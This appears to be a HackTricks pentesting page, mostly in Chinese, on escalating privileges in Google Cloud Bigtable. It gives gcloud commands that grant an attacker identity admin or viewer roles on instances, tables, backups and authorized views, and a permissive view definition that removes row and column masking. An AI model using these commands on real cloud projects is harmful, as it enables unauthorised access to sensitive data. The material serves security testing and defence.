# GCP - Bigtable Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

有关 Bigtable 的更多信息，请查看：

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### `bigtable.instances.setIamPolicy`

**Permissions:** `bigtable.instances.setIamPolicy`（通常还需要 `bigtable.instances.getIamPolicy` 来读取当前绑定）。

拥有实例的 IAM 策略允许你授予自己 **`roles/bigtable.admin`**（或任何自定义角色），该权限会级联到该实例中的每个集群、表、备份以及授权视图。
```bash
gcloud bigtable instances add-iam-policy-binding <instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
> [!TIP]
> 如果无法列出现有的绑定（bindings），可以编写一个新的策略文档，并使用 `gcloud bigtable instances set-iam-policy` 推送它，前提是你在策略中保留了自己。

After having this permission check in the [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) techniques for more ways to abuse Bigtable permissions.

### `bigtable.tables.setIamPolicy`

**权限：** `bigtable.tables.setIamPolicy`（可选 `bigtable.tables.getIamPolicy`）。

实例策略可能被锁定，同时单个表的权限被委派。如果你能够编辑表的 IAM，你可以 **将自己提升为目标数据集的所有者**，而无需影响其他工作负载。
```bash
gcloud bigtable tables add-iam-policy-binding <table-id> \
--instance=<instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
获得此权限后，请查看[**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md)中的技术，以了解更多滥用 Bigtable 权限的方法。

### `bigtable.backups.setIamPolicy`

**权限：** `bigtable.backups.setIamPolicy`

备份可以恢复到你控制的**任何项目中的任何实例**。首先，授予你的身份对备份的访问权限，然后将其恢复到你拥有 Admin/Owner 角色的 sandbox 中。

如果你拥有权限 `bigtable.backups.setIamPolicy`，你可以授予自己权限 `bigtable.backups.restore` 来恢复旧的备份并尝试访问敏感信息。
```bash
# Take ownership of the snapshot
gcloud bigtable backups add-iam-policy-binding <backup-id> \
--instance=<instance-id> --cluster=<cluster-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
在查看 [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) 中关于如何恢复备份的权限检查之后。

### 更新 Authorized View

**权限:** `bigtable.authorizedViews.update`

Authorized Views 用于对行/列进行脱敏。修改或删除它们会**移除防御者所依赖的细粒度保护措施**。
```bash
# Broaden the subset by uploading a permissive definition
gcloud bigtable authorized-views update <view-id> \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/permissive-view.json --ignore-warnings

# Json example not filtering any row or column
cat <<'EOF' > /tmp/permissive-view.json
{
"subsetView": {
"rowPrefixes": [""],
"familySubsets": {
"<SOME FAMILITY NAME USED IN THE CURRENT TABLE>": {
"qualifierPrefixes": [""]
}
}
}
}
EOF

# Describe the authorized view to get a family name
gcloud bigtable authorized-views describe <view-id> \
--instance=<instance-id> --table=<table-id>
```
在获得此权限后，请参阅[**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) 了解如何从授权视图读取。

### `bigtable.authorizedViews.setIamPolicy`

**权限：**  `bigtable.authorizedViews.setIamPolicy`.

拥有此权限的攻击者可以为自己授予对授权视图的访问权限，该视图可能包含他们原本无法访问的敏感数据。
```bash
# Give more permissions over an existing view
gcloud bigtable authorized-views add-iam-policy-binding <view-id> \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.viewer'
```
在 [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) 中已经有此权限检查，用于查看如何从授权视图读取。



{{#include ../../../banners/hacktricks-training.md}}
